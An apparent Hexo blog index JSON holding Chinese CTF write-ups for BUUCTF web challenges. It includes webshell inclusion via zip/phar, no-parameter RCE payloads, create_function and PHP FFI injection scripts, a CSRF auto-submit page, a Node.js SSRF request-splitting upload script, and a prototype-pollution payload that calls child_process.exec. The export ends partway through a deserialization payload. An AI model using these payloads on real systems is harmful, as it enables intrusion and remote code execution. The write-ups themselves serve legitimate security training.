{"meta":{"title":"Virtua1","subtitle":"你只有非常努力，才能看起来毫不费力","description":"","author":"Virtua1","url":"https://v1sun.github.io","root":"/"},"pages":[{"title":"关于我","date":"2021-04-18T12:50:56.000Z","updated":"2021-05-02T16:04:54.564Z","comments":true,"path":"about/index.html","permalink":"https://v1sun.github.io/about/index.html","excerpt":"","text":"即将毕业的大四学生 CTFer Web入门选手 Misc签到选手 Pwn正在入门……"},{"title":"分类","date":"2021-05-02T15:38:32.000Z","updated":"2021-05-02T15:39:15.813Z","comments":true,"path":"categories/index.html","permalink":"https://v1sun.github.io/categories/index.html","excerpt":"","text":""},{"title":"友情链接","date":"2021-05-02T15:31:31.000Z","updated":"2021-05-02T15:32:17.888Z","comments":true,"path":"link/index.html","permalink":"https://v1sun.github.io/link/index.html","excerpt":"","text":""}],"posts":[{"title":"BUUCTF-2020极客大挑战","slug":"BUUCTF-2020极客大挑战","date":"2021-04-21T12:15:00.000Z","updated":"2021-05-02T15:25:47.833Z","comments":true,"path":"2021/04/21/BUUCTF-2020极客大挑战/","link":"","permalink":"https://v1sun.github.io/2021/04/21/BUUCTF-2020%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/","excerpt":"","text":"BUUCTF-2020极客大挑战[WEB]Welcome题目访问不了，bp抓包，响应头显示： 改为post请求： 数组绕过sha1：roam1[]=1&amp;roam2[]=2 phpinfo()页面搜索flag： [WEB]myblog打开题目看到url，猜测存在伪协议读取文件，没有读到index 读到了login.php： 1?page&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;login 12345678910//secret.php&lt;?php$secret_seed = mt_rand();?&gt;//login.php&lt;?phprequire_once(&quot;secret.php&quot;);mt_srand($secret_seed);$_SESSION[&#x27;password&#x27;] = mt_rand();?&gt; 看到传入的username&amp;password进入了/?page=admin/user，读取一下： 123456789101112131415&lt;?phperror_reporting(0);session_start();$logined = false;if (isset($_POST[&#x27;username&#x27;]) and isset($_POST[&#x27;password&#x27;]))&#123; if ($_POST[&#x27;username&#x27;] === &quot;Longlone&quot; and $_POST[&#x27;password&#x27;] == $_SESSION[&#x27;password&#x27;])&#123; // No one knows my password, including myself $logined = true; $_SESSION[&#x27;status&#x27;] = $logined; &#125;&#125;if ($logined === false &amp;&amp; !isset($_SESSION[&#x27;status&#x27;]) || $_SESSION[&#x27;status&#x27;] !== true)&#123; echo &quot;&lt;script&gt;alert(&#x27;username or password not correct!&#x27;);window.location.href=&#x27;index.php?page=login&#x27;;&lt;/script&gt;&quot;; die();&#125;?&gt; 通过关键代码可知用户名为Longlone，密码为随机数验证通过会进入admin目录，可见在验证密码的时候采用== ，我们可以通过清空session 然后密码为空绕过： 成功登陆。 接下来审计读到的其他代码： 12345678910111213141516&lt;?php if(isset($_FILES[&#x27;Files&#x27;]) and $_SESSION[&#x27;status&#x27;] === true)&#123; $tmp_file = $_FILES[&#x27;Files&#x27;][&#x27;name&#x27;]; $tmp_path = $_FILES[&#x27;Files&#x27;][&#x27;tmp_name&#x27;]; if(($extension = pathinfo($tmp_file)[&#x27;extension&#x27;]) != &quot;&quot;)&#123; $allows = array(&#x27;gif&#x27;,&#x27;jpeg&#x27;,&#x27;jpg&#x27;,&#x27;png&#x27;); if(in_array($extension,$allows,true) and in_array($_FILES[&#x27;Files&#x27;][&#x27;type&#x27;],array_map(function($ext)&#123;return &#x27;image/&#x27;.$ext;&#125;,$allows),true))&#123; $upload_name = sha1(md5(uniqid(microtime(true), true))).&#x27;.&#x27;.$extension; move_uploaded_file($tmp_path,&quot;assets/img/upload/&quot;.$upload_name); echo &quot;&lt;script&gt;alert(&#x27;Update image -&gt; assets/img/upload/$&#123;upload_name&#125;&#x27;) &lt;/script&gt;&quot;; &#125; else &#123; echo &quot;&lt;script&gt;alert(&#x27;Update illegal! Only allows like \\&#x27;gif\\&#x27;, \\&#x27;jpeg\\&#x27;, \\&#x27;jpg\\&#x27;, \\&#x27;png\\&#x27; &#x27;) &lt;/script&gt;&quot;; &#125; &#125; &#125; ?&gt; 看到存在这么一段代码，文件上传，采用的是白名单，想到首页的文件包含，我们可以文件包含配合上传图片getshell，但是通过我们伪协议读取源码得知包含的时候会加上.php后缀，因此通过zip:// 或者phar://协议来包含。利用过程： 1一句话木马-&gt;压缩为zip文件-&gt;修改后缀的jpg-&gt;利用zip:&#x2F;&#x2F;或者phar:&#x2F;&#x2F;协议包含-&gt;getshell 先传phpinfo测试，上传后路径： 1.&#x2F;assets&#x2F;img&#x2F;upload&#x2F;a4c4ab7e86ffb8ae7ebf44a377492d0b073e3b45.jpg 1page&#x3D;zip:&#x2F;&#x2F;.&#x2F;assets&#x2F;img&#x2F;upload&#x2F;a4c4ab7e86ffb8ae7ebf44a377492d0b073e3b45.jpg%231 然后上传一句话木马： 利用phar协议： 1page&#x3D;phar:&#x2F;&#x2F;.&#x2F;assets&#x2F;img&#x2F;upload&#x2F;7f9dd8cedfae86b489906d5126b1ccad949bb11b.jpg&#x2F;1 [WEB]rceme 执行命令前有一个验证，python脚本构造即可。查看源码发现提示 存在swp文件泄露： 下载恢复文件： 12345678910111213141516171819202122&lt;?phperror_reporting(0);session_start();if(!isset($_SESSION[&#x27;code&#x27;]))&#123; $_SESSION[&#x27;code&#x27;] = substr(md5(mt_rand().sha1(mt_rand)),0,5);&#125;if(isset($_POST[&#x27;cmd&#x27;]) and isset($_POST[&#x27;code&#x27;]))&#123; if(substr(md5($_POST[&#x27;code&#x27;]),0,5) !== $_SESSION[&#x27;code&#x27;])&#123; die(&#x27;&lt;script&gt;alert(\\&#x27;Captcha error~\\&#x27;);history.back()&lt;/script&gt;&#x27;); &#125; $_SESSION[&#x27;code&#x27;] = substr(md5(mt_rand().sha1(mt_rand)),0,5); $code = $_POST[&#x27;cmd&#x27;]; if(strlen($code) &gt; 70 or preg_match(&#x27;/[A-Za-z0-9]|\\&#x27;|&quot;|`|\\ |,|\\.|-|\\+|=|\\/|\\\\|&lt;|&gt;|\\$|\\?|\\^|&amp;|\\|/ixm&#x27;,$code))&#123; die(&#x27;&lt;script&gt;alert(\\&#x27;Longlone not like you~\\&#x27;);history.back()&lt;/script&gt;&#x27;); &#125;else if(&#x27;;&#x27; === preg_replace(&#x27;/[^\\s\\(\\)]+?\\((?R)?\\)/&#x27;, &#x27;&#x27;, $code))&#123; @eval($code); die(); &#125;&#125;?&gt; RCE限制长度小于等于70位 限制特殊符号数字字母，不能用异或和或运算 —可以利用取反 只允许无参数的函数传递进来，函数名只能为字母—利用无参数RCE 关于无参数RCE不再详细分析，可参考：https://xz.aliyun.com/t/9360 这里利用getallheaders() 先看一下位置： 12345var_dump(getallheaders());构造取反后：(~%89%9E%8D%A0%9B%8A%92%8F)((~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C)());但是本题目需要构造无参数：利用[!%FF]或者[!%aa][~%89%9E%8D%A0%9B%8A%92%8F][!%FF]([~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C][!%FF]()); 注意提交要通过bp 不然会编码： 然后构造：system(next(getallheaders())) 1234system(next(getallheaders()));(~%8C%86%8C%8B%9A%92)((~%91%9A%87%8B)((~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C)()))[~%8C%86%8C%8B%9A%92][!%FF]([~%91%9A%87%8B][!%FF]([~%98%9A%8B%9E%93%93%97%9A%9E%9B%9A%8D%8C][!%FF]())); [WEB]FighterFightsInvincibly直接view-source: 看到是动态代码执行，构造create_function代码注入，看下phpinfo： 1fighter&#x3D;create_function&amp;fights&#x3D;&amp;invincibly&#x3D;1;&#125;phpinfo();&#x2F;* 来个shell吧 1fighter&#x3D;create_function&amp;fights&#x3D;&amp;invincibly&#x3D;1;&#125;eval($_POST[V]);&#x2F;* 需要bypass，php版本7.4，利用php7.4 FFI实现用PHP代码调用C代码的方式执行命令。 蚁剑绕过利用失败，采取手动方式： flag读不全。其实还可以采用FFI调用PHP源码中的函数 12345678910# -*-coding:utf-8import requestsurl = &quot;http://daf3777d-58e5-4447-a849-b1a2ba7c1e9c.node3.buuoj.cn/&quot;#data = &#123;&quot;fighter&quot;: &quot;create_function&quot;, &quot;fights&quot;: &quot;&quot;, &quot;invincibly&quot;: &quot;1;&#125;phpinfo();/*&quot;&#125;#data = &#123;&quot;fighter&quot;: &quot;create_function&quot;, &quot;fights&quot;: &quot;&quot;, &quot;invincibly&quot;: &quot;&quot;&quot;1;&#125;$e=FFI::cdef(&quot;void *popen(char*,char*);\\\\nvoid pclose(void*);\\\\nint fgetc(void*);&quot;,&quot;libc.so.6&quot;);$o = $e-&gt;popen(&quot;/readflag&quot;,&quot;r&quot;);$d=&quot;&quot;;while(($c=$e-&gt;fgetc($o))!=-1)&#123;$d.=str_pad(strval(dechex($c)),2,&quot;0&quot;,0);&#125;$e-&gt;pclose($o);echo hex2bin($d);/*&quot;&quot;&quot;&#125;data = &#123;&quot;fighter&quot;: &quot;create_function&quot;, &quot;fights&quot;: &quot;&quot;, &quot;invincibly&quot;: &quot;&quot;&quot;&#125;$e=FFI::cdef(&quot;int php_exec(int type, char *cmd);&quot;);$e-&gt;php_exec(3,$_REQUEST[&#x27;cmd&#x27;]);/*&quot;&quot;&quot;&#125;res = requests.post(url, data=data,params=&#123;&quot;cmd&quot;: &quot;/readflag&quot;&#125;)print (res.content) [WEB]flagshop环境不太顺畅..中间重新起了好几次环境。。 这道题目考察的是CSRF，这种题目并不多，通过这个题目详细分析下这种漏洞。 先了解一下：CSRF 详解与攻防实战 首先进入环境注册登录： 需要足够的钱购买flag。看一下怎么获得足够的钱，发现其有一个转账功能，与上文CSRF讲解的例子不谋而合同样是转账操作，其次还存在一个提交报告的地方，思路很明显了，就是构造恶意的链接，然后在提交报告处提交恶意链接，这样管理员查看报告就会自动转账： 看到Longlone用户，应该是利用CSRF让其给注册的用户转账，利用burp构造CSRF的POC放在vps上： POC修改一下，加一个脚本自动提交的代码，放在vps上index.html，然后提交报告： 1234567891011121314151617&lt;html&gt; &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt; &lt;head&gt; &lt;script&gt; window.onload = function() &#123; document.getElementById(&quot;postsubmit&quot;).click();&#125; &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;form action=&quot;http://31a0d988-edec-4409-83c4-04e3545ef852.node3.buuoj.cn/transfer.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;target&quot; value=&quot;111&quot; /&gt; &lt;input type=&quot;hidden&quot; name=&quot;money&quot; value=&quot;9999999999999999&quot; /&gt; &lt;input type=&quot;hidden&quot; name=&quot;messages&quot; value=&quot;111&quot; /&gt; &lt;input type=&quot;submit&quot; value=&quot;Submit request&quot; /&gt; &lt;/form&gt; &lt;/body&gt;&lt;/html&gt; 提交成功后返回首页查看余额，购买flag即可。 [WEB]greatphp代码审计： 12345678910111213141516171819202122232425&lt;?phperror_reporting(0);class SYCLOVER &#123; public $syc; public $lover; public function __wakeup()&#123; if( ($this-&gt;syc != $this-&gt;lover) &amp;&amp; (md5($this-&gt;syc) === md5($this-&gt;lover)) &amp;&amp; (sha1($this-&gt;syc)=== sha1($this-&gt;lover)) )&#123; if(!preg_match(&quot;/\\&lt;\\?php|\\(|\\)|\\&quot;|\\&#x27;/&quot;, $this-&gt;syc, $match))&#123; eval($this-&gt;syc); &#125; else &#123; die(&quot;Try Hard !!&quot;); &#125; &#125; &#125;&#125;if (isset($_GET[&#x27;great&#x27;]))&#123; unserialize($_GET[&#x27;great&#x27;]);&#125; else &#123; highlight_file(__FILE__);&#125;?&gt; 反序列化题目，可以看到想要执行命令必须满足MD5 、sha1值相等，但是既满足相等又要执行命令难以绕过。这里有个考察点就是： md5/sha1函数对一个类进行处理的时候会触发这个类的__toString魔术方法 这里想到了利用原生类。利用Error 内置类，在进行处理的时候触发__toString ，先看一下类： 可见会输出payload 错误文件路径 以及行号，所以我们要想得到输出相同就需要在同一行： 可见这样就可以使的$a $b 相等，但是输出的报错信息相同。 接下来考虑怎么代码执行，首先我们需要控制整个代码块，利用?&gt;&lt;?php 形式，因为过滤了&lt;?php 采用短标签的形式&lt;?= ，其次过滤了小括号 因为控制了整个代码块，可以采取include flag文件的形式，过滤了”，无法利用 include &quot;/flag&quot; 利用取反绕过： 12输出报错信息：Error: ?&gt;&lt;?&#x3D;include &quot;&#x2F;flag&quot;?&gt;#先闭合拼接：eval(Error: ?&gt;&lt;?&#x3D;include &quot;&#x2F;flag&quot;?&gt;);#成功控制代码块 包含文件 payload： 1“?&gt;&lt;?&#x3D;include~”.urldeocde(%D0%99%93%9E%98).&quot;?&gt;&quot; exp： 12345678910111213&lt;?phpclass SYCLOVER &#123; public $syc; public $lover;&#125;$payload = &quot;?&gt;&lt;?=include~&quot;.urldecode(&quot;%D0%99%93%9E%98&quot;).&quot;?&gt;&quot;;$a = new Error($payload,1);$b = new Error($payload,2);$v = new SYCLOVER();$v-&gt;syc=$a;$v-&gt;lover=$b;#echo serialize($v); echo urlencode(serialize($v)); [WEB]cross待解决","categories":[{"name":"Writeup","slug":"Writeup","permalink":"https://v1sun.github.io/categories/Writeup/"}],"tags":[{"name":"buuctf","slug":"buuctf","permalink":"https://v1sun.github.io/tags/buuctf/"},{"name":"Writeup","slug":"Writeup","permalink":"https://v1sun.github.io/tags/Writeup/"}]},{"title":"BUUCTF-GYCTF2020","slug":"BUUCTF-2019极客大挑战","date":"2021-04-19T13:10:00.000Z","updated":"2021-05-02T14:53:54.939Z","comments":true,"path":"2021/04/19/BUUCTF-2019极客大挑战/","link":"","permalink":"https://v1sun.github.io/2021/04/19/BUUCTF-2019%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/","excerpt":"","text":"BUUCTF-GYCTF2020[WEB]Node Game代码审计可以查看源码，代码审计： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128var express = require(&#x27;express&#x27;);var app = express();var fs = require(&#x27;fs&#x27;);var path = require(&#x27;path&#x27;);var http = require(&#x27;http&#x27;);var pug = require(&#x27;pug&#x27;);var morgan = require(&#x27;morgan&#x27;);const multer = require(&#x27;multer&#x27;);app.use(multer(&#123;dest: &#x27;./dist&#x27;&#125;).array(&#x27;file&#x27;));app.use(morgan(&#x27;short&#x27;));app.use(&quot;/uploads&quot;,express.static(path.join(__dirname, &#x27;/uploads&#x27;)))app.use(&quot;/template&quot;,express.static(path.join(__dirname, &#x27;/template&#x27;)))app.get(&#x27;/&#x27;, function(req, res) &#123; var action = req.query.action?req.query.action:&quot;index&quot;; if( action.includes(&quot;/&quot;) || action.includes(&quot;\\\\&quot;) )&#123; res.send(&quot;Errrrr, You have been Blocked&quot;); &#125; file = path.join(__dirname + &#x27;/template/&#x27;+ action +&#x27;.pug&#x27;); var html = pug.renderFile(file); res.send(html);&#125;);app.post(&#x27;/file_upload&#x27;, function(req, res)&#123; var ip = req.connection.remoteAddress; var obj = &#123; msg: &#x27;&#x27;, &#125; if (!ip.includes(&#x27;127.0.0.1&#x27;)) &#123; obj.msg=&quot;only admin&#x27;s ip can use it&quot; res.send(JSON.stringify(obj)); return &#125; fs.readFile(req.files[0].path, function(err, data)&#123; if(err)&#123; obj.msg = &#x27;upload failed&#x27;; res.send(JSON.stringify(obj)); &#125;else&#123; var file_path = &#x27;/uploads/&#x27; + req.files[0].mimetype +&quot;/&quot;; var file_name = req.files[0].originalname var dir_file = __dirname + file_path + file_name if(!fs.existsSync(__dirname + file_path))&#123; try &#123; fs.mkdirSync(__dirname + file_path) &#125; catch (error) &#123; obj.msg = &quot;file type error&quot;; res.send(JSON.stringify(obj)); return &#125; &#125; try &#123; fs.writeFileSync(dir_file,data) obj = &#123; msg: &#x27;upload success&#x27;, filename: file_path + file_name &#125; &#125; catch (error) &#123; obj.msg = &#x27;upload failed&#x27;; &#125; res.send(JSON.stringify(obj)); &#125; &#125;)&#125;)app.get(&#x27;/source&#x27;, function(req, res) &#123; res.sendFile(path.join(__dirname + &#x27;/template/source.txt&#x27;));&#125;);app.get(&#x27;/core&#x27;, function(req, res) &#123; var q = req.query.q; var resp = &quot;&quot;; if (q) &#123; var url = &#x27;http://localhost:8081/source?&#x27; + q console.log(url) var trigger = blacklist(url); if (trigger === true) &#123; res.send(&quot;&lt;p&gt;error occurs!&lt;/p&gt;&quot;); &#125; else &#123; try &#123; http.get(url, function(resp) &#123; resp.setEncoding(&#x27;utf8&#x27;); resp.on(&#x27;error&#x27;, function(err) &#123; if (err.code === &quot;ECONNRESET&quot;) &#123; console.log(&quot;Timeout occurs&quot;); return; &#125; &#125;); resp.on(&#x27;data&#x27;, function(chunk) &#123; try &#123; resps = chunk.toString(); res.send(resps); &#125;catch (e) &#123; res.send(e.message); &#125; &#125;).on(&#x27;error&#x27;, (e) =&gt; &#123; res.send(e.message);&#125;); &#125;); &#125; catch (error) &#123; console.log(error); &#125; &#125; &#125; else &#123; res.send(&quot;search param &#x27;q&#x27; missing!&quot;); &#125;&#125;)function blacklist(url) &#123; var evilwords = [&quot;global&quot;, &quot;process&quot;,&quot;mainModule&quot;,&quot;require&quot;,&quot;root&quot;,&quot;child_process&quot;,&quot;exec&quot;,&quot;\\&quot;&quot;,&quot;&#x27;&quot;,&quot;!&quot;]; var arrayLen = evilwords.length; for (var i = 0; i &lt; arrayLen; i++) &#123; const trigger = url.includes(evilwords[i]); if (trigger === true) &#123; return true &#125; &#125;&#125;var server = app.listen(8081, function() &#123; var host = server.address().address var port = server.address().port console.log(&quot;Example app listening at http://%s:%s&quot;, host, port)&#125;) 通过审计发现存在以下功能： 1234&#39;&#x2F;&#39; &#x2F;&#x2F;indexpost &#x2F;file_upload &#x2F;&#x2F;文件上传get &#x2F;source &#x2F;&#x2F;查看源码get &#x2F;core &#x2F;&#x2F;存在SSRF 漏洞分析核心代码分析： get /core 存在SSRF，对我们传入的q参数进行拼接： 1url &#x3D; &#39;http:&#x2F;&#x2F;localhost:8081&#x2F;source?&#39; + q 然后通过blacklist函数进行验证，blacklist函数： 12345678910function blacklist(url) &#123; var evilwords = [&quot;global&quot;, &quot;process&quot;,&quot;mainModule&quot;,&quot;require&quot;,&quot;root&quot;,&quot;child_process&quot;,&quot;exec&quot;,&quot;\\&quot;&quot;,&quot;&#x27;&quot;,&quot;!&quot;]; var arrayLen = evilwords.length; for (var i = 0; i &lt; arrayLen; i++) &#123; const trigger = url.includes(evilwords[i]); if (trigger === true) &#123; return true &#125; &#125;&#125; 对敏感函数进行了过滤。 post /file_upload 是个文件上传的地方，需要满足以下条件： 1ip.includes(&#39;127.0.0.1&#39;) 首页还存在提示： 存在SSRF+nodejs 想到了http拆分攻击，Node 版本为 8.12.0，存在漏洞，因此可以利用上传功能。 提示了pug，同时模板渲染采用的是pug引擎： 看一下 pug 引擎文档： 从代码可以看到存在一个/template模板目录，存放着后缀为pug的模板文件，看下文档里边的包含语法，那么我们可以上传一个pug文件，pug文件里写入恶意的包含代码，包含我们要读的文件，在模板渲染的时候就会包含目标文件。 1234567//- index.pugdoctype htmlhtml head style include style.css 思路就很明显了，因为限制了本地上传我们利用nodejs 的SSRF构造一个post请求，上传pug文件，包含读取任意文件。 漏洞利用构造post请求，采用抓包的方法获取上传请求： 直接上传会提示： 构造exp：利用nodejs ssrf构造post请求 1234567891011121314151617181920212223242526272829303132333435363738394041#-*-coding:utf-8import urllib.parseimport requestspayload &#x3D; &#39;&#39;&#39; HTTP&#x2F;1.1Host: xConnection: keep-alivePOST &#x2F;file_upload HTTP&#x2F;1.1Host: xConnection: keep-aliveContent-Type: multipart&#x2F;form-data; boundary&#x3D;---------------------------303312354614442Content-Length: 317-----------------------------303312354614442Content-Disposition: form-data; name&#x3D;&quot;file&quot;; filename&#x3D;&quot;v1sun.pug&quot;Content-Type: &#x2F;..&#x2F;template&#x2F;&#x2F;- v1sun.pugdoctype htmlhtml head style include ..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flag.txt -----------------------------303312354614442--GET &#x2F;flag HTTP&#x2F;1.1Host: xConnection: closex:&#39;&#39;&#39;payload &#x3D; payload.replace(&quot;\\n&quot;, &quot;\\r\\n&quot;)payload &#x3D; &#39;&#39;.join(chr(int(&#39;0xff&#39; + hex(ord(c))[2:].zfill(2), 16)) for c in payload)#print(payload)#print (urllib.parse.quote(payload))r &#x3D; requests.get(&#39;http:&#x2F;&#x2F;1b1aa7a2-6ecd-4a57-b9de-5bbebae5c2a0.node3.buuoj.cn&#x2F;core?q&#x3D;&#39;+ urllib.parse.quote(payload))print(r.text) Content-Type处存在一个小trick，利用nodejs的目录穿越，上传到模板目录： 1Content-Type: &#x2F;..&#x2F;template 同时要修改：Connection: keep-alive 以至于让我们的所有请求包含进去 上传后访问：?action=v1sun 查看源码就得到flag [WEB]Ez_Express题目分析 但是ADMIN注册不了，利用TEST注册登录后查看源码：TEST 123456 下载源码 代码审计审计发现是nodejs：app.js 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950var createError = require(&#x27;http-errors&#x27;);var express = require(&#x27;express&#x27;);var path = require(&#x27;path&#x27;);var cookieParser = require(&#x27;cookie-parser&#x27;);var logger = require(&#x27;morgan&#x27;);const session = require(&#x27;express-session&#x27;)const randomize = require(&#x27;randomatic&#x27;)const bodyParser = require(&#x27;body-parser&#x27;)var indexRouter = require(&#x27;./routes/index&#x27;);var app = express();// view engine setupapp.set(&#x27;views&#x27;, path.join(__dirname, &#x27;views&#x27;));app.set(&#x27;view engine&#x27;, &#x27;ejs&#x27;);app.disable(&#x27;etag&#x27;);app.use(bodyParser.urlencoded(&#123;extended: true&#125;)).use(bodyParser.json())app.use(session(&#123; name: &#x27;session&#x27;, secret: randomize(&#x27;aA0&#x27;, 16), resave: false, saveUninitialized: false&#125;))app.use(logger(&#x27;dev&#x27;));app.use(express.json());app.use(express.urlencoded(&#123; extended: false &#125;));app.use(cookieParser());app.use(express.static(path.join(__dirname, &#x27;public&#x27;)));app.use(&#x27;/&#x27;, indexRouter);// catch 404 and forward to error handlerapp.use(function(req, res, next) &#123; next(createError(404));&#125;);// error handlerapp.use(function(err, req, res, next) &#123; // set locals, only providing error in development res.locals.message = err.message; res.locals.error = req.app.get(&#x27;env&#x27;) === &#x27;development&#x27; ? err : &#123;&#125;; // render the error page res.status(err.status || 500); res.render(&#x27;error&#x27;);&#125;);module.exports = app; app.js没什么特别关注的点。 index.js： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172var express = require(&#x27;express&#x27;);var router = express.Router();const isObject = obj =&gt; obj &amp;&amp; obj.constructor &amp;&amp; obj.constructor === Object;const merge = (a, b) =&gt; &#123; for (var attr in b) &#123; if (isObject(a[attr]) &amp;&amp; isObject(b[attr])) &#123; merge(a[attr], b[attr]); &#125; else &#123; a[attr] = b[attr]; &#125; &#125; return a&#125;const clone = (a) =&gt; &#123; return merge(&#123;&#125;, a);&#125;function safeKeyword(keyword) &#123; if(keyword.match(/(admin)/is)) &#123; return keyword &#125; return undefined&#125;router.get(&#x27;/&#x27;, function (req, res) &#123; if(!req.session.user)&#123; res.redirect(&#x27;/login&#x27;); &#125; res.outputFunctionName=undefined; res.render(&#x27;index&#x27;,data=&#123;&#x27;user&#x27;:req.session.user.user&#125;);&#125;);router.get(&#x27;/login&#x27;, function (req, res) &#123; res.render(&#x27;login&#x27;);&#125;);router.post(&#x27;/login&#x27;, function (req, res) &#123; if(req.body.Submit==&quot;register&quot;)&#123; if(safeKeyword(req.body.userid))&#123; res.end(&quot;&lt;script&gt;alert(&#x27;forbid word&#x27;);history.go(-1);&lt;/script&gt;&quot;) &#125; req.session.user=&#123; &#x27;user&#x27;:req.body.userid.toUpperCase(), &#x27;passwd&#x27;: req.body.pwd, &#x27;isLogin&#x27;:false &#125; res.redirect(&#x27;/&#x27;); &#125; else if(req.body.Submit==&quot;login&quot;)&#123; if(!req.session.user)&#123;res.end(&quot;&lt;script&gt;alert(&#x27;register first&#x27;);history.go(-1);&lt;/script&gt;&quot;)&#125; if(req.session.user.user==req.body.userid&amp;&amp;req.body.pwd==req.session.user.passwd)&#123; req.session.user.isLogin=true; &#125; else&#123; res.end(&quot;&lt;script&gt;alert(&#x27;error passwd&#x27;);history.go(-1);&lt;/script&gt;&quot;) &#125; &#125; res.redirect(&#x27;/&#x27;); ;&#125;);router.post(&#x27;/action&#x27;, function (req, res) &#123; if(req.session.user.user!=&quot;ADMIN&quot;)&#123;res.end(&quot;&lt;script&gt;alert(&#x27;ADMIN is asked&#x27;);history.go(-1);&lt;/script&gt;&quot;)&#125; req.session.user.data = clone(req.body); res.end(&quot;&lt;script&gt;alert(&#x27;success&#x27;);history.go(-1);&lt;/script&gt;&quot;); &#125;);router.get(&#x27;/info&#x27;, function (req, res) &#123; res.render(&#x27;index&#x27;,data=&#123;&#x27;user&#x27;:res.outputFunctionName&#125;);&#125;)module.exports = router; 看到了js原型链污染漏洞的标志性函数：merge 应该就是原型链污染了。 但是看到： ADMIN用户才可以触发clone 进而利用merge。但是限制了admin注册，看下注册登陆处： 注册处会有验证，但是后边写入session的时候会经过toUpperCase()函数的处理，不由得想到了nodejs的大小写转换特性： 对于toUpperCase(): 1字符&quot;ı&quot;、&quot;ſ&quot; 经过toUpperCase处理后结果为 &quot;I&quot;、&quot;S&quot; 对于toLowerCase(): 1字符&quot;K&quot;经过toLowerCase处理后结果为&quot;k&quot;(这个K不是K) 在绕一些规则的时候就可以利用这几个特殊字符进行绕过 漏洞利用可见我们要想得到ADMIN 可以注册admın 经过处理就得到ADMIN： 成功登陆。接下来就是原型链污染，首先寻找污染参数，看到存在outputFunctionName，并且res.outputFunctionName=undefined;在index页面渲染，那么可以构造payload污染参数，通过info页面触发，因为不能回显，可以反弹shell或者写入到一个文件内然后访问： 12Content-Type: application&#x2F;json&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;: &quot;_tmp1;global.process.mainModule.require(&#39;child_process&#39;).exec(&#39;cat &#x2F;flag &gt; &#x2F;app&#x2F;public&#x2F;flag&#39;);var _tmp2&quot;&#125;&#125; 路径通过报错得到： 然后访问/flag 得到flag。 [WEB]Easyphp题目分析扫描目录发现： 存在备份文件，下载代码审计： admin 进入update页面 可得到flag 查看是否存在注入： 存在预处理，因此无法注入 查询的sql语句为： 1select id,password from user where username&#x3D;? 查询admin用户的密码，密码和数据库相等则登陆成功。 通过控制执行的语句即可绕过登录admin： 12select id,&quot;202cb962ac59075b964b07152d234b70&quot; from user where username&#x3D;? &#x2F;&#x2F;&quot;202cb962ac59075b964b07152d234b70&quot;为123的MD5，密码输入123即可 接下来就是利用反序列化漏洞，构造pop链去执行sql语句： 1UpdateHelper类在结束时 会echo 调用魔术方法 1触发User的__toString()方法 1调用Info的__call()方法 1__call 方法调用了login 这里可以： 12$this-&gt;CtrlCase 为dbCtrl类login参数为：$this-&gt;age传进来的 pop 链： 1UpdateHelper::__destruct()-&gt;User::__toString()-&gt;Info::__call-&gt;dbCtrl::login 1O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:3:&quot;age&quot;;s:70:&quot;select 1,&quot;202cb962ac59075b964b07152d234b70&quot; from user where username&#x3D;?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:1:&#123;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:3:&quot;123&quot;;&#125;&#125;&#125;&#125; 寻找反序列化入口： update页面会调用update方法： 可见$_POST[&#39;age&#39;]与$_POST[&#39;nickname&#39;]可控，传入Info类实例化，然后反序列化，再经过safe函数处理。 可见如果我们直接传入payload，那么payload不会被识别为对象，而是字符串，但是这里我们看到了典型的反序列化字符串逃逸的形式，可以利用字符串逃逸： 可见是一个字符增加的字符串逃逸。 漏洞利用Info()类正常序列化： 1O:4:&quot;Info&quot;:3:&#123;s:3:&quot;age&quot;;s:7:&quot;testage&quot;;s:8:&quot;nickname&quot;;s:8:&quot;testname&quot;;s:8:&quot;CtrlCase&quot;;N;&#125; 当把我们把payload作为nickname值传进去，为了拼接闭合，对payload改一下： 1&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:3:&quot;age&quot;;s:70:&quot;select 1,&quot;202cb962ac59075b964b07152d234b70&quot; from user where username&#x3D;?&quot;;s:8:&quot;nickname&quot;;O:4:&quot;Info&quot;:1:&#123;s:8:&quot;CtrlCase&quot;;O:6:&quot;dbCtrl&quot;:2:&#123;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:3:&quot;123&quot;;&#125;&#125;&#125;&#125;&#125; 即把payload当做Info()类正常序列化的N值，最后加}闭合，序列化之后： 1O:4:&quot;Info&quot;:2:&#123;s:3:&quot;age&quot;;s:1:&quot;1&quot;;s:8:&quot;nickname&quot;;s:265:&quot;&quot;;s:8:&quot;CtrlCase&quot;;O:12:&quot;UpdateHelper&quot;:1:&#123;s:3:&quot;sql&quot;;O:4:&quot;User&quot;:2:&#123;s:3:&quot;age&quot;;s:70:&quot;select 1,&quot;202cb962ac59075b964b07152d234b70&quot; from user where 